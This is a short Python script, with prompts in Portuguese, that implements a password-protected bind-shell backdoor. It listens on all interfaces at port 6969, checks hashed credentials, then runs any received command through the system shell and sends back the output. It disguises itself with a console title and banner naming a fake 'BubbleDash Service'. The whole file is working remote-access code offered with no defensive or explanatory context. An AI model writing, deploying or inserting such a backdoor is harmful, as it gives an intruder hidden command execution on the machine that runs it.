#! /usr/bin/env python
import socket  
import subprocess  
import os  
import hashlib  

HOST = '0.0.0.0'  
PORT = 6969  
USER_HASH = "d977411713ae71584e9e3f4637389263988e6827013086e3d67e14a92cbcec98"  
PASSWORD_HASH = "696ea48e9fe277a9484ebb10f8b5da8e04a2049aed8c2dfacd4b7695a93c1eee"  
MAX_ATTEMPTS = 3  

if os.name == "nt":  
    import ctypes  
    ctypes.windll.kernel32.SetConsoleTitleW("BubbleDash Service")  

def get_sha256_hash(text):  
    return hashlib.sha256(text.encode()).hexdigest()  

def handle_client(conn):  
    try:  
        conn.sendall("BubbleDash Service 69.8b_NT\n".encode("utf-8"))  
        conn.sendall("Digite o usuário: ".encode("utf-8"))  
        user = conn.recv(1024).decode("utf-8", errors="ignore").strip()  

        if get_sha256_hash(user) != USER_HASH:  
            conn.sendall("Usuário incorreto!\n".encode("utf-8"))  
            conn.close()  
            return  

        attempts = 0  
        while attempts < MAX_ATTEMPTS:  
            conn.sendall("Digite a senha: ".encode("utf-8"))  
            password = conn.recv(1024).decode("utf-8", errors="ignore").strip()  

            if get_sha256_hash(password) == PASSWORD_HASH:  
                conn.sendall("Acesso concedido!\n".encode("utf-8"))  
                break  
            else:  
                attempts += 1  
                conn.sendall(f"Senha incorreta! Tentativas restantes: {MAX_ATTEMPTS - attempts}\n".encode("utf-8"))  
                if attempts == MAX_ATTEMPTS:  
                    conn.close()  
                    return  

        current_dir = os.getcwd()  
        while True:  
            conn.sendall(f"{current_dir}> ".encode("utf-8"))  
            command = conn.recv(1024).decode("utf-8", errors="ignore").strip()  

            if not command:  
                continue  

            if command.lower() in ["exit", "quit"]:  
                break  

            if command.startswith("cd "):  
                new_dir = command[3:].strip()  
                if os.path.isdir(new_dir):  
                    os.chdir(new_dir)  
                    current_dir = os.getcwd()  
                continue  

            try:  
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, cwd=current_dir)  
                conn.sendall(output)  
            except subprocess.CalledProcessError as e:  
                conn.sendall(e.output)  
    except:  
        pass  
    finally:  
        conn.close()  

def main():  
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
        s.bind((HOST, PORT))  
        s.listen()  
        while True:  
            conn, addr = s.accept()  
            handle_client(conn)  

if __name__ == "__main__":  
    main()